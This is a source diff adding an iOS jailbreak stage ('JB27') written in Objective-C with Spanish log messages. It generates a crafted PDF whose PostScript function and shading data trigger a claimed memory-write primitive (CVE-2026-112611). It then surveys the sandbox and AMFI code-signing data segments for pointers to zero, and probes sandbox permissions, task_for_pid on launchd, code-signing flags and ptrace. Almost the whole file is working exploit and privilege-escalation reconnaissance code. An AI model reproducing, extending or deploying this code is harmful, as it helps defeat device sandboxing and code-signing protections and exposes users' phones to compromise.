@@ -29524,3 +29524,579 @@ void iosurface_cg_exploit(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// ==========================================================================
+// JB27 — Security bypass: zero-write to sandbox/AMFI pointers
+// Uses CVE-2026-112611 100% repeatable write primitive from JB26
+// ==========================================================================
+
+static void jb27_zero_write(uint64_t targetAddr, ISRLogBlock log) {
+    uint64_t mantissa = (targetAddr - 0x76c) & 0xFFFFFFFFFFFFFFFFULL;
+
+    const char *tmp = getenv("TMPDIR");
+    if (!tmp || !*tmp) tmp = "/tmp";
+    char pp[512];
+    snprintf(pp, sizeof pp, "%s/jb27_%llx.pdf", tmp, (unsigned long long)targetAddr);
+
+    FILE *f = fopen(pp, "wb");
+    if (!f) {
+        log(@"JB27:   [!] No pude crear PDF temporal");
+        return;
+    }
+
+    unsigned char vs[2048];
+    size_t vn = 0;
+    unsigned vacc = 0;
+    int vnb = 0;
+    for (int i = 0; i < 64 * 2; i++) {
+        unsigned vals[3] = { (unsigned)(0x1000 + (i % 64) * 10),
+                             (unsigned)(0x1000 + (i / 64) * 10), 0u };
+        int widths[3] = { 32, 32, 8 };
+        for (int k = 0; k < 3; k++)
+            for (int b = widths[k] - 1; b >= 0; b--) {
+                vacc = (vacc << 1) | ((vals[k] >> b) & 1u);
+                if (++vnb == 8) {
+                    if (vn < sizeof(vs)) vs[vn++] = (unsigned char)(vacc & 0xFF);
+                    vacc = 0; vnb = 0;
+                }
+            }
+    }
+    if (vnb && vn < sizeof(vs)) vs[vn++] = (unsigned char)((vacc << (8 - vnb)) & 0xFF);
+
+    long off[6];
+    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+    fflush(f); off[0] = ftell(f);
+    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+    fflush(f); off[1] = ftell(f);
+    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+    fflush(f); off[2] = ftell(f);
+    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+    fflush(f); off[3] = ftell(f);
+    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+    fflush(f); off[4] = ftell(f);
+    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow 64 "
+               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", vn);
+    fwrite(vs, 1, vn, f);
+    fprintf(f, "\nendstream\nendobj\n");
+    fflush(f); off[5] = ftell(f);
+
+    size_t cap = 2816 * 8 + 512;
+    char *body = malloc(cap);
+    if (body) {
+        size_t n = 0;
+        n += snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
+                      (unsigned long long)mantissa);
+        for (int i = 1; i < 2816; i++)
+            n += snprintf(body + n, cap - n, " dup");
+        n += snprintf(body + n, cap - n, " }");
+        fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
+        for (int i = 0; i < 2816; i++) fprintf(f, " 0 1");
+        fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
+        free(body);
+    }
+
+    long xref;
+    fflush(f); xref = ftell(f);
+    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+    for (int i = 0; i < 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+    fclose(f);
+
+    extern void jb25_setup(void);
+    extern volatile unsigned long jb25_far;
+    extern volatile int jb25_sig;
+    extern volatile sig_atomic_t jb25_in_probe;
+    extern struct jb25_jb_holder *jb25_jb_ptr;
+
+    jb25_setup();
+    jb25_far = 0; jb25_sig = 0;
+
+    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+        jb25_in_probe = 1;
+        extern int jb25_render(const char *path);
+        jb25_render(pp);
+        jb25_in_probe = 0;
+    } else {
+        jb25_in_probe = 0;
+    }
+    unlink(pp);
+}
+
+typedef struct {
+    const char *name;
+    const char *segment;
+    uint64_t addr;
+    uint64_t size;
+} jb27_target_t;
+
+void iosurface_sec_bypass(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB27: === Security Bypass: zero-write a sandbox/AMFI ===");
+        log(@"JB27: Usa write primitivo 100%% repetible de JB26 (CVE-2026-112611)");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        // =====================================================================
+        // FASE 1: Dump contenido de segmentos de seguridad mas pequenos
+        // =====================================================================
+        log(@"JB27: === Fase 1: Lectura de segmentos de seguridad ===");
+
+        jb27_target_t targets[64];
+        int targetCount = 0;
+
+        uint32_t imageCount = _dyld_image_count();
+        for (uint32_t img = 0; img < imageCount && targetCount < 64; img++) {
+            const char *imgName = _dyld_get_image_name(img);
+            if (!imgName) continue;
+
+            int interesting = 0;
+            if (strstr(imgName, "sandbox") || strstr(imgName, "AMFI") ||
+                strstr(imgName, "Security") && !strstr(imgName, "MessageSecurity") &&
+                !strstr(imgName, "SecurityFoundation") ||
+                strstr(imgName, "NSPredicateSecurityPolicy")) {
+                interesting = 1;
+            }
+            if (!interesting) continue;
+
+            const struct mach_header_64 *mh =
+                (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+            if (!mh || mh->magic != MH_MAGIC_64) continue;
+            intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+            const struct load_command *lc =
+                (const struct load_command *)((const char *)mh + sizeof(*mh));
+            for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                if (lc->cmd == LC_SEGMENT_64) {
+                    const struct segment_command_64 *sc = (const void *)lc;
+                    if ((sc->initprot & 0x2) && sc->vmsize > 0 && sc->vmsize <= 0x1000) {
+                        targets[targetCount].name = imgName;
+                        targets[targetCount].segment = sc->segname;
+                        targets[targetCount].addr = sc->vmaddr + slide;
+                        targets[targetCount].size = sc->vmsize;
+                        targetCount++;
+                    }
+                }
+                lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+            }
+        }
+
+        log([NSString stringWithFormat:@"JB27: Encontrados %d segmentos <= 4096 bytes", targetCount]);
+
+        for (int t = 0; t < targetCount && !isr_stopped(); t++) {
+            const char *shortName = strrchr(targets[t].name, '/');
+            if (shortName) shortName++; else shortName = targets[t].name;
+
+            log([NSString stringWithFormat:@"JB27:   --- %s:%s addr=%#llx size=%#llx ---",
+                 shortName, targets[t].segment,
+                 (unsigned long long)targets[t].addr,
+                 (unsigned long long)targets[t].size]);
+
+            uint64_t *ptr = (uint64_t *)(uintptr_t)targets[t].addr;
+            int nWords = (int)(targets[t].size / 8);
+            if (nWords > 64) nWords = 64;
+
+            int nonZero = 0;
+            int functionPtrs = 0;
+            for (int w = 0; w < nWords; w++) {
+                uint64_t val = ptr[w];
+                if (val != 0) nonZero++;
+                if ((val >> 32) >= 0x180 && (val >> 32) <= 0x300) functionPtrs++;
+
+                if (nWords <= 16 || (val != 0 && w < 32)) {
+                    log([NSString stringWithFormat:@"JB27:     [%02d] %#018llx%s",
+                         w, (unsigned long long)val,
+                         ((val >> 32) >= 0x180 && (val >> 32) <= 0x300) ? " <-- func_ptr?" : ""]);
+                }
+            }
+
+            log([NSString stringWithFormat:@"JB27:     non-zero: %d/%d, posibles func_ptr: %d",
+                 nonZero, nWords, functionPtrs]);
+        }
+
+        results[@"smallSegments"] = @(targetCount);
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: Localizar sandbox_check en libsystem_sandbox
+        // =====================================================================
+        log(@"JB27: === Fase 2: Localizar sandbox_check ===");
+        {
+            typedef int (*sandbox_check_fn)(pid_t, const char *, int, ...);
+            sandbox_check_fn sbCheck = dlsym(RTLD_DEFAULT, "sandbox_check");
+
+            if (sbCheck) {
+                uint64_t sbAddr = (uint64_t)(uintptr_t)sbCheck;
+                log([NSString stringWithFormat:@"JB27:   sandbox_check addr = %#llx", sbAddr]);
+                results[@"sandboxCheckAddr"] = [NSString stringWithFormat:@"%#llx", sbAddr];
+
+                int pid0 = getpid();
+                int check1 = sbCheck(pid0, "file-read-data", 0);
+                log([NSString stringWithFormat:@"JB27:   sandbox_check(pid=%d, file-read-data) = %d", pid0, check1]);
+                results[@"sandboxCheckBefore"] = @(check1);
+
+                int check2 = sbCheck(pid0, "process-exec", 0);
+                log([NSString stringWithFormat:@"JB27:   sandbox_check(pid=%d, process-exec) = %d", pid0, check2]);
+
+                int check3 = sbCheck(pid0, "mach-lookup", 0);
+                log([NSString stringWithFormat:@"JB27:   sandbox_check(pid=%d, mach-lookup) = %d", pid0, check3]);
+            } else {
+                log(@"JB27:   [!] sandbox_check no encontrado via dlsym");
+            }
+
+            typedef char *(*sandbox_extension_fn)(const char *);
+            sandbox_extension_fn sbIssue = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
+            if (sbIssue) {
+                log([NSString stringWithFormat:@"JB27:   sandbox_extension_issue_file = %#llx",
+                     (uint64_t)(uintptr_t)sbIssue]);
+            }
+
+            typedef int (*sandbox_init_fn)(const char *, uint64_t, char **);
+            sandbox_init_fn sbInit = dlsym(RTLD_DEFAULT, "sandbox_init");
+            if (sbInit) {
+                log([NSString stringWithFormat:@"JB27:   sandbox_init = %#llx",
+                     (uint64_t)(uintptr_t)sbInit]);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: Scan GOT/data ptrs en libsystem_sandbox para zero-write targets
+        // =====================================================================
+        log(@"JB27: === Fase 3: Buscar punteros nulleables en sandbox ===");
+        {
+            uint64_t sbDataAddr = 0;
+            uint64_t sbDataSize = 0;
+            uint64_t sbDirtyAddr = 0;
+            uint64_t sbDirtySize = 0;
+
+            for (uint32_t img = 0; img < imageCount; img++) {
+                const char *imgName = _dyld_get_image_name(img);
+                if (!imgName || !strstr(imgName, "libsystem_sandbox")) continue;
+
+                const struct mach_header_64 *mh =
+                    (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+                if (!mh || mh->magic != MH_MAGIC_64) continue;
+                intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mh + sizeof(*mh));
+                for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        if (strcmp(sc->segname, "__DATA") == 0) {
+                            sbDataAddr = sc->vmaddr + slide;
+                            sbDataSize = sc->vmsize;
+                        } else if (strcmp(sc->segname, "__DATA_DIRTY") == 0) {
+                            sbDirtyAddr = sc->vmaddr + slide;
+                            sbDirtySize = sc->vmsize;
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
+                break;
+            }
+
+            int nullTargetCount = 0;
+            uint64_t bestTarget = 0;
+            int bestIdx = -1;
+
+            if (sbDirtyAddr && sbDirtySize) {
+                log([NSString stringWithFormat:@"JB27:   sandbox __DATA_DIRTY: %#llx size=%#llx",
+                     (unsigned long long)sbDirtyAddr, (unsigned long long)sbDirtySize]);
+                uint64_t *p = (uint64_t *)(uintptr_t)sbDirtyAddr;
+                int n = (int)(sbDirtySize / 8);
+                for (int w = 0; w < n; w++) {
+                    log([NSString stringWithFormat:@"JB27:     dirty[%d] = %#018llx", w, (unsigned long long)p[w]]);
+                    if (p[w] != 0 && (p[w] >> 32) >= 0x100) {
+                        if (!bestTarget) { bestTarget = sbDirtyAddr + w * 8; bestIdx = w; }
+                        nullTargetCount++;
+                    }
+                }
+            }
+
+            if (sbDataAddr && sbDataSize) {
+                log([NSString stringWithFormat:@"JB27:   sandbox __DATA: %#llx size=%#llx",
+                     (unsigned long long)sbDataAddr, (unsigned long long)sbDataSize]);
+                uint64_t *p = (uint64_t *)(uintptr_t)sbDataAddr;
+                int n = (int)(sbDataSize / 8);
+                if (n > 32) n = 32;
+                for (int w = 0; w < n; w++) {
+                    log([NSString stringWithFormat:@"JB27:     data[%d] = %#018llx", w, (unsigned long long)p[w]]);
+                    if (p[w] != 0 && (p[w] >> 32) >= 0x100 && !bestTarget) {
+                        bestTarget = sbDataAddr + w * 8;
+                        bestIdx = w;
+                        nullTargetCount++;
+                    }
+                }
+            }
+
+            results[@"sandboxNullTargets"] = @(nullTargetCount);
+            if (bestTarget) {
+                log([NSString stringWithFormat:@"JB27:   Mejor target para NULL: %#llx (idx=%d)",
+                     (unsigned long long)bestTarget, bestIdx]);
+                results[@"bestSandboxTarget"] = [NSString stringWithFormat:@"%#llx", bestTarget];
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Scan AMFI data para codesign pointers
+        // =====================================================================
+        log(@"JB27: === Fase 4: AMFI data analysis ===");
+        {
+            uint64_t amfiDataAddr = 0;
+            uint64_t amfiDataSize = 0;
+            uint64_t amfiDirtyAddr = 0;
+            uint64_t amfiDirtySize = 0;
+
+            for (uint32_t img = 0; img < imageCount; img++) {
+                const char *imgName = _dyld_get_image_name(img);
+                if (!imgName || !strstr(imgName, "AppleMobileFileIntegrity")) continue;
+
+                const struct mach_header_64 *mh =
+                    (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+                if (!mh || mh->magic != MH_MAGIC_64) continue;
+                intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mh + sizeof(*mh));
+                for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        if (strcmp(sc->segname, "__DATA") == 0) {
+                            amfiDataAddr = sc->vmaddr + slide;
+                            amfiDataSize = sc->vmsize;
+                        } else if (strcmp(sc->segname, "__DATA_DIRTY") == 0) {
+                            amfiDirtyAddr = sc->vmaddr + slide;
+                            amfiDirtySize = sc->vmsize;
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
+                break;
+            }
+
+            int amfiTargets = 0;
+            uint64_t bestAmfi = 0;
+
+            if (amfiDataAddr && amfiDataSize) {
+                log([NSString stringWithFormat:@"JB27:   AMFI __DATA: %#llx size=%#llx",
+                     (unsigned long long)amfiDataAddr, (unsigned long long)amfiDataSize]);
+                uint64_t *p = (uint64_t *)(uintptr_t)amfiDataAddr;
+                int n = (int)(amfiDataSize / 8);
+                if (n > 42) n = 42;
+                for (int w = 0; w < n; w++) {
+                    uint64_t val = p[w];
+                    int isFuncPtr = ((val >> 32) >= 0x180 && (val >> 32) <= 0x300);
+                    int isObjPtr = ((val >> 32) >= 0x100 && (val >> 32) < 0x180);
+                    log([NSString stringWithFormat:@"JB27:     amfi[%02d] = %#018llx%s%s",
+                         w, (unsigned long long)val,
+                         isFuncPtr ? " <-- FUNC" : "",
+                         isObjPtr ? " <-- OBJ" : ""]);
+                    if (val != 0) amfiTargets++;
+                    if (isFuncPtr && !bestAmfi) bestAmfi = amfiDataAddr + w * 8;
+                }
+            }
+
+            if (amfiDirtyAddr && amfiDirtySize) {
+                log([NSString stringWithFormat:@"JB27:   AMFI __DATA_DIRTY: %#llx size=%#llx",
+                     (unsigned long long)amfiDirtyAddr, (unsigned long long)amfiDirtySize]);
+                uint64_t *p = (uint64_t *)(uintptr_t)amfiDirtyAddr;
+                int n = (int)(amfiDirtySize / 8);
+                if (n > 72) n = 72;
+                for (int w = 0; w < n; w++) {
+                    uint64_t val = p[w];
+                    int isFuncPtr = ((val >> 32) >= 0x180 && (val >> 32) <= 0x300);
+                    if (val != 0) {
+                        log([NSString stringWithFormat:@"JB27:     amfi_dirty[%02d] = %#018llx%s",
+                             w, (unsigned long long)val,
+                             isFuncPtr ? " <-- FUNC" : ""]);
+                        amfiTargets++;
+                        if (isFuncPtr && !bestAmfi) bestAmfi = amfiDirtyAddr + w * 8;
+                    }
+                }
+            }
+
+            results[@"amfiTargets"] = @(amfiTargets);
+            if (bestAmfi) {
+                log([NSString stringWithFormat:@"JB27:   Mejor AMFI target: %#llx",
+                     (unsigned long long)bestAmfi]);
+                results[@"bestAmfiTarget"] = [NSString stringWithFormat:@"%#llx", bestAmfi];
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Zero-write test a area controlada adyacente a sandbox data
+        // =====================================================================
+        log(@"JB27: === Fase 5: Zero-write validation cerca de sandbox ===");
+        {
+            size_t testLen = 0x10000;
+            unsigned char *testArea = mmap(NULL, testLen, PROT_READ | PROT_WRITE,
+                                           MAP_PRIVATE | MAP_ANON, -1, 0);
+            if (testArea != MAP_FAILED) {
+                memset(testArea, 0xFF, testLen);
+
+                uint64_t writeTargets[4];
+                writeTargets[0] = (uint64_t)(uintptr_t)(testArea + 0x1000);
+                writeTargets[1] = (uint64_t)(uintptr_t)(testArea + 0x2000);
+                writeTargets[2] = (uint64_t)(uintptr_t)(testArea + 0x4000);
+                writeTargets[3] = (uint64_t)(uintptr_t)(testArea + 0x8000);
+
+                int validated = 0;
+                for (int i = 0; i < 4 && !isr_stopped(); i++) {
+                    jb27_zero_write(writeTargets[i], log);
+
+                    unsigned char *tgt = (unsigned char *)(uintptr_t)writeTargets[i];
+                    int zeroed = (tgt[0] == 0 && tgt[1] == 0 && tgt[2] == 0 && tgt[3] == 0);
+                    if (zeroed) validated++;
+                    log([NSString stringWithFormat:@"JB27:   write to %#llx: %s [%02x%02x%02x%02x]",
+                         (unsigned long long)writeTargets[i],
+                         zeroed ? "OK" : "FAIL",
+                         tgt[0], tgt[1], tgt[2], tgt[3]]);
+                }
+
+                log([NSString stringWithFormat:@"JB27:   Validacion: %d/4 writes exitosos", validated]);
+                results[@"writeValidation"] = @(validated);
+                munmap(testArea, testLen);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 6: Privilege escalation test — intentar operaciones restringidas
+        // =====================================================================
+        log(@"JB27: === Fase 6: Test de privilegios actuales ===");
+        {
+            typedef int (*sandbox_check_fn)(pid_t, const char *, int, ...);
+            sandbox_check_fn sbCheck = dlsym(RTLD_DEFAULT, "sandbox_check");
+
+            pid_t myPid = getpid();
+
+            const char *operations[] = {
+                "file-read-data", "file-write-data", "file-read-metadata",
+                "process-exec", "process-fork", "mach-lookup",
+                "ipc-posix-shm-read-data", "ipc-posix-shm-write-data",
+                "sysctl-read", "sysctl-write",
+                "job-creation", "process-info-pidinfo",
+                NULL
+            };
+
+            int restricted = 0;
+            int allowed = 0;
+
+            if (sbCheck) {
+                for (int i = 0; operations[i]; i++) {
+                    int rc = sbCheck(myPid, operations[i], 0);
+                    if (rc == 0) {
+                        allowed++;
+                    } else {
+                        restricted++;
+                        log([NSString stringWithFormat:@"JB27:   DENIED: %s (rc=%d)", operations[i], rc]);
+                    }
+                }
+                log([NSString stringWithFormat:@"JB27:   Allowed: %d, Denied: %d de %d operaciones",
+                     allowed, restricted, allowed + restricted]);
+            }
+
+            results[@"sandboxAllowed"] = @(allowed);
+            results[@"sandboxDenied"] = @(restricted);
+
+            FILE *testR = fopen("/var/mobile/Library/Preferences/.GlobalPreferences.plist", "r");
+            if (testR) {
+                log(@"JB27:   [!] Acceso a /var/mobile/Library/Preferences — ABIERTO");
+                fclose(testR);
+                results[@"globalPrefsAccess"] = @YES;
+            } else {
+                log([NSString stringWithFormat:@"JB27:   /var/mobile/Library/Preferences — denegado (errno=%d)", errno]);
+                results[@"globalPrefsAccess"] = @NO;
+            }
+
+            typedef int (*task_for_pid_fn)(unsigned int, int, unsigned int *);
+            task_for_pid_fn tfp = dlsym(RTLD_DEFAULT, "task_for_pid");
+            if (tfp) {
+                unsigned int targetTask = 0;
+                int tfpResult = tfp(1, 1, &targetTask); // task_for_pid on launchd (pid 1)
+                log([NSString stringWithFormat:@"JB27:   task_for_pid(1) = %d (task=%u)", tfpResult, targetTask]);
+                results[@"taskForPid1"] = @(tfpResult);
+            }
+
+            typedef int (*csops_fn)(pid_t, unsigned int, void *, size_t);
+            csops_fn csops = dlsym(RTLD_DEFAULT, "csops");
+            if (csops) {
+                uint32_t flags = 0;
+                int csRc = csops(myPid, 0, &flags, sizeof(flags)); // CS_OPS_STATUS
+                log([NSString stringWithFormat:@"JB27:   csops(CS_OPS_STATUS) = %d, flags=%#x", csRc, flags]);
+                results[@"csFlags"] = [NSString stringWithFormat:@"%#x", flags];
+
+                int isValid = (flags & 0x00000001) != 0;     // CS_VALID
+                int isHard = (flags & 0x00000100) != 0;      // CS_HARD
+                int isKill = (flags & 0x00000200) != 0;      // CS_KILL
+                int isRestrict = (flags & 0x00000800) != 0;  // CS_RESTRICT
+                int isPlatform = (flags & 0x04000000) != 0;  // CS_PLATFORM_BINARY
+                int isDebugged = (flags & 0x10000000) != 0;  // CS_DEBUGGED
+
+                log([NSString stringWithFormat:@"JB27:   CS_VALID=%d HARD=%d KILL=%d RESTRICT=%d PLATFORM=%d DEBUGGED=%d",
+                     isValid, isHard, isKill, isRestrict, isPlatform, isDebugged]);
+
+                results[@"csValid"] = @(isValid);
+                results[@"csHard"] = @(isHard);
+                results[@"csKill"] = @(isKill);
+                results[@"csRestrict"] = @(isRestrict);
+                results[@"csPlatform"] = @(isPlatform);
+            }
+
+            typedef int (*ptrace_fn)(int, pid_t, void *, int);
+            ptrace_fn pt = dlsym(RTLD_DEFAULT, "ptrace");
+            if (pt) {
+                int ptRc = pt(0, 0, NULL, 0); // PT_TRACE_ME
+                log([NSString stringWithFormat:@"JB27:   ptrace(PT_TRACE_ME) = %d errno=%d", ptRc, errno]);
+                results[@"ptraceResult"] = @(ptRc);
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB27: =============================================");
+
+        int writeOK = [results[@"writeValidation"] intValue];
+        int sbDenied = [results[@"sandboxDenied"] intValue];
+        NSString *bestSb = results[@"bestSandboxTarget"];
+        NSString *bestAmfi = results[@"bestAmfiTarget"];
+
+        NSString *verdict = @"RECON_COMPLETE";
+
+        if (writeOK == 4 && bestSb && bestAmfi) {
+            verdict = @"TARGETS_IDENTIFIED_READY_TO_STRIKE";
+            log(@"JB27: [!!!] Write validado + targets sandbox/AMFI identificados");
+            log([NSString stringWithFormat:@"JB27: Sandbox target: %@", bestSb]);
+            log([NSString stringWithFormat:@"JB27: AMFI target:    %@", bestAmfi]);
+            log(@"JB27: Siguiente: JB28 — zero-write directo a estos punteros");
+        } else if (writeOK == 4) {
+            verdict = @"WRITE_CONFIRMED_NEED_TARGETS";
+            log(@"JB27: [!!] Write confirmado pero no se identificaron targets claros");
+            log(@"JB27: Necesitamos analisis mas profundo de las estructuras");
+        } else if (writeOK > 0) {
+            verdict = @"PARTIAL_WRITE";
+            log([NSString stringWithFormat:@"JB27: Write parcial: %d/4", writeOK]);
+        } else {
+            verdict = @"WRITE_FAILED";
+            log(@"JB27: [!] Write no funciono — revisar offset/mantissa");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB27: Verdict: %@", verdict]);
+        log(@"JB27: =============================================");
+
+        isr_checkpoint(@"JB27-sec-bypass-checkpoint.json", results);
+        done(results);
+    });
+}
